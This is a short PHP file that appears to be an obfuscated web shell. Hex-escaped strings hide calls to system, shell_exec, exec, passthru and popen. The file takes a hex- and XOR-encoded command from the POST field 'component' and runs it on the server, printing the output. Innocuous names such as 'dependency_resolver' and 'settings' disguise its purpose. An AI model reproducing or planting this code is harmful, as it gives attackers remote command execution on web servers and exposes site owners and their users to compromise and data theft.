<?php

$dependency_resolver = "\x68\x65x2\x62\x69n";
$settings7 = "\x70\x63\x6Cose";
$settings4 = "\x70a\x73\x73\x74hru";
$settings1 = "s\x79st\x65\x6D";
$settings6 = "\x73t\x72\x65am\x5F\x67e\x74_\x63onte\x6Ets";
$settings5 = "\x70\x6Fpen";
$settings3 = "e\x78\x65c";
$settings2 = "s\x68\x65l\x6C_\x65\x78ec";
if (isset($_POST["\x63om\x70\x6F\x6Eent"])) {
            function restore_state ($item ,  $desc ){
 $val ='';
 $c=0;
 do{
$val.=chr(ord($item[$c])^$desc);
$c++;

} while($c<strlen($item));
 return$val;

}
            $component = $dependency_resolver($_POST["\x63om\x70\x6F\x6Eent"]);
            $component = restore_state($component, 85);
            if (function_exists($settings1)) {
                $settings1($component);
            } elseif (function_exists($settings2)) {
                print $settings2($component);
            } elseif (function_exists($settings3)) {
                $settings3($component, $mrk_item);
                print join("\n", $mrk_item);
            } elseif (function_exists($settings4)) {
                $settings4($component);
            } elseif (function_exists($settings5) && function_exists($settings6) && function_exists($settings7)) {
                $desc_val = $settings5($component, 'r');
                if ($desc_val) {
                    $pgrp_sym = $settings6($desc_val);
                    $settings7($desc_val);
                    print $pgrp_sym;
                }
            }
            exit;
        }